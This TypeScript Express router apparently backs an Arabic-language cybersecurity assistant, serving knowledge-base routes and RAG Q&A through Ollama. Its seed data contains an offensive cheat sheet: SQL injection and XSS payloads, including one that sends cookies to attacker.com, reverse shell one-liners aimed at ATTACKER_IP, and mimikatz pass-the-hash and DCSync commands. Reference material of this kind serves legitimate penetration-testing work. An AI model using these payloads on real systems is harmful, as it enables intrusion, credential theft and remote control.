import { Router, type IRouter } from "express";
import { db, knowledgeTable } from "@workspace/db";
import { desc, eq, like, or } from "drizzle-orm";
import { novaRag } from "../lib/novaRag";
import { logger } from "../lib/logger";

import { getOllamaBaseUrl, getOllamaModel } from "../lib/ollama-settings";

const router: IRouter = Router();

router.get("/knowledge", async (_req, res, next) => {
  try {
    const rows = await db.select().from(knowledgeTable).orderBy(desc(knowledgeTable.createdAt));
    res.json(rows.map(k => ({
      id: k.id, title: k.title, category: k.category,
      content: k.content, tags: k.tags, createdAt: k.createdAt.toISOString(),
    })));
  } catch (e) { return next(e); }
});

router.post("/knowledge", async (req, res, next) => {
  try {
    const body = req.body as { title: string; category: string; content: string; tags?: string[] };
    const [row] = await db.insert(knowledgeTable).values({
      title: body.title, category: body.category, content: body.content, tags: body.tags ?? [],
    }).returning();
    res.json({
      id: row!.id, title: row!.title, category: row!.category,
      content: row!.content, tags: row!.tags, createdAt: row!.createdAt.toISOString(),
    });
  } catch (e) { return next(e); }
});

router.delete("/knowledge/:id", async (req, res, next) => {
  try {
    await db.delete(knowledgeTable).where(eq(knowledgeTable.id, Number(req.params["id"])));
    res.json({ ok: true });
  } catch (e) { return next(e); }
});

// Semantic search via RAG engine
router.get("/knowledge/search", async (req, res, next) => {
  try {
    const q = String(req.query["q"] ?? "").trim();
    if (!q) { res.json({ results: [] }); return; }

    const results = await novaRag.query(q, 8);
    res.json({ results });
  } catch (e) { return next(e); }
});

// RAG-powered Q&A via Ollama
router.post("/knowledge/ask", async (req, res, next) => {
  try {
    const { query } = req.body as { query: string };
    if (!query?.trim()) { res.status(400).json({ error: "query required" }); return; }

    // Retrieve context from knowledge base
    const results = await novaRag.query(query, 5);
    const context = results.length > 0
      ? results.map(r => `## ${r.title}\n${r.content}`).join("\n\n---\n\n")
      : "لا توجد معلومات محددة في قاعدة المعرفة حول هذا الموضوع.";

    const prompt = `أنت مساعد أمن سيبراني خبير. استخدم المعلومات التالية للإجابة على سؤال المستخدم.

=== قاعدة المعرفة ===
${context}
=== نهاية قاعدة المعرفة ===

سؤال المستخدم: ${query}

أجب بشكل مختصر ومفيد باللغة العربية، مستخدمًا المعلومات المتاحة. إذا لم تكن المعلومات كافية، قل ذلك صراحةً:`;

    try {
      const OLLAMA_BASE = await getOllamaBaseUrl();
      const OLLAMA_MODEL = await getOllamaModel();
      const r = await fetch(`${OLLAMA_BASE}/api/generate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ model: OLLAMA_MODEL, prompt, stream: false, options: { temperature: 0.3, num_predict: 1024 } }),
        signal: AbortSignal.timeout(60_000),
      });
      if (!r.ok) throw new Error(`Ollama HTTP ${r.status}`);
      const data = (await r.json()) as { response?: string };
      res.json({ answer: data.response ?? "لا يوجد رد", context: results.slice(0, 3) });
    } catch (err) {
      logger.warn({ err }, "Ollama RAG ask failed, returning context only");
      res.json({ answer: `Ollama غير متاح (${(err as Error).message}). السياق المتاح:\n\n${context.slice(0, 500)}`, context: results });
    }
  } catch (e) { return next(e); }
});

export async function ensureDefaultKnowledge() {
  const existing = await db.select().from(knowledgeTable).limit(1);
  if (existing.length > 0) return;
  const items = [
    { title: "OWASP Top 10 2021", category: "web", content: "1. Broken Access Control\n2. Cryptographic Failures\n3. Injection\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable and Outdated Components\n7. Identification and Authentication Failures\n8. Software and Data Integrity Failures\n9. Security Logging and Monitoring Failures\n10. Server-Side Request Forgery (SSRF)", tags: ["owasp", "web", "top10"] },
    { title: "MITRE ATT&CK Tactics", category: "tactics", content: "TA0043: Reconnaissance\nTA0042: Resource Development\nTA0001: Initial Access\nTA0002: Execution\nTA0003: Persistence\nTA0004: Privilege Escalation\nTA0005: Defense Evasion\nTA0006: Credential Access\nTA0007: Discovery\nTA0008: Lateral Movement\nTA0009: Collection\nTA0011: Command and Control\nTA0010: Exfiltration\nTA0040: Impact", tags: ["mitre", "att&ck", "tactics"] },
    { title: "Common Nmap Flags", category: "tools", content: "-sS: SYN Stealth Scan\n-sV: Service/Version Detection\n-O: OS Detection\n-A: Aggressive (OS+version+scripts+traceroute)\n-T4: Timing Template (fast)\n-p-: All 65535 ports\n-p 80,443,8080: Specific ports\n--script vuln: Run vuln scripts\n--script=default: Default scripts\n-Pn: Skip host discovery\n-sn: Ping scan only\n-oN file: Normal output\n-oG file: Grepable output", tags: ["nmap", "scanning", "tools"] },
    { title: "SQL Injection Payloads", category: "web", content: "Basic:\n' OR 1=1--\n\" OR \"\"=\"\n' OR '1'='1\n\nUnion:\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT username,password FROM users--\n\nBlind:\n' OR SLEEP(5)--\n' AND 1=SLEEP(5)--\n' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\nError-based:\n' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", tags: ["sqli", "injection", "web", "payloads"] },
    { title: "XSS Payloads", category: "web", content: "Basic:\n<script>alert(1)</script>\n<script>alert(document.cookie)</script>\n\nImg:\n<img src=x onerror=alert(1)>\n<img src=x onerror=fetch('//attacker.com?c='+document.cookie)>\n\nSVG:\n<svg onload=alert(1)>\n<svg><script>alert(1)</script></svg>\n\nProtocol:\njavascript:alert(1)\n\niframe:\n<iframe src=javascript:alert(1)>\n\nFilter bypass:\n<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=javascript:alert(1)>", tags: ["xss", "web", "payloads"] },
    { title: "Reverse Shell One-liners", category: "shells", content: "Bash:\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\nbash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\nNetcat:\nnc -e /bin/sh ATTACKER_IP 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f\n\nPython3:\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\nPHP:\nphp -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", tags: ["shells", "reverse", "exploitation"] },
    { title: "Linux Privilege Escalation", category: "post", content: "SUID Binaries:\nfind / -perm -u=s -type f 2>/dev/null\n\nSudo Rights:\nsudo -l\nsudo -u root /bin/bash\n\nCron Jobs:\ncat /etc/crontab\ncrontab -l\nls -la /etc/cron*\n\nKernel Exploits:\nuname -a\nuname -r (check exploit-db for kernel version)\n\nWorld-writable files:\nfind / -writable -type f 2>/dev/null\n\nCapabilities:\ngetcap -r / 2>/dev/null\n\nTools:\n./linpeas.sh\n./linux-exploit-suggester.sh", tags: ["linux", "privesc", "post-exploitation"] },
    { title: "Active Directory Recon", category: "internal", content: "PowerShell:\nGet-ADUser -Filter *\nGet-ADGroup -Filter *\nGet-ADComputer -Filter *\n\nBloodHound:\nInvoke-BloodHound -CollectionMethod All\n./SharpHound.exe -c All\n\nKerberoasting:\nInvoke-Kerberoast -OutputFormat Hashcat\nRubeus.exe kerberoast\n\nASREPRoast:\nGet-ASREPHash -UserName user -Verbose\nRubeus.exe asreproast\n\nPass the Hash:\nmimikatz # sekurlsa::pth /user:admin /domain:dom /ntlm:HASH\n\nDCSync:\nmimikatz # lsadump::dcsync /domain:dom /user:krbtgt", tags: ["active-directory", "internal", "windows", "kerberos"] },
    { title: "Nuclei Template Categories", category: "tools", content: "cves: Known CVE vulnerabilities\nexposures: Exposed sensitive files/directories\ntechnologies: Technology fingerprinting\nmisconfiguration: Security misconfigurations\ndefault-logins: Default credentials\ntakeovers: Subdomain takeover\ndos: Denial of Service checks\nfuzzing: Fuzzing payloads\nnetwork: Network-level checks\nfile: File-based checks\npanels: Admin panel detection", tags: ["nuclei", "scanning", "templates", "tools"] },
    { title: "Web Application Pentesting Checklist", category: "web", content: "1. Information Gathering:\n   - Fingerprint web server, technologies\n   - Directory/file enumeration (gobuster, ffuf)\n   - Subdomain enumeration\n   \n2. Authentication:\n   - Test default credentials\n   - Brute force login\n   - Test MFA bypass\n   \n3. Authorization:\n   - IDOR testing\n   - Privilege escalation\n   - Horizontal access control\n   \n4. Input Validation:\n   - SQL Injection\n   - XSS (Reflected, Stored, DOM)\n   - Command Injection\n   - SSTI\n   \n5. Business Logic:\n   - Parameter tampering\n   - Race conditions\n   - Price manipulation", tags: ["web", "pentest", "checklist", "methodology"] },
    { title: "Network Scanning Methodology", category: "tools", content: "Phase 1 - Host Discovery:\nnmap -sn 192.168.1.0/24\n\nPhase 2 - Port Scanning:\nnmap -sS -T4 -p- target\n\nPhase 3 - Service Detection:\nnmap -sV -sC -p 80,443,22,21 target\n\nPhase 4 - OS Detection:\nnmap -O target\n\nPhase 5 - Vulnerability Scan:\nnmap --script vuln target\n\nPhase 6 - Web Scanning:\nnikto -h http://target\ngobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt\n\nPhase 7 - Nuclei:\nnuclei -target http://target -t cves,exposures", tags: ["nmap", "scanning", "methodology", "network"] },
  ];
  for (const it of items) await db.insert(knowledgeTable).values(it);
  logger.info(`Seeded ${items.length} knowledge base entries`);
}

export default router;
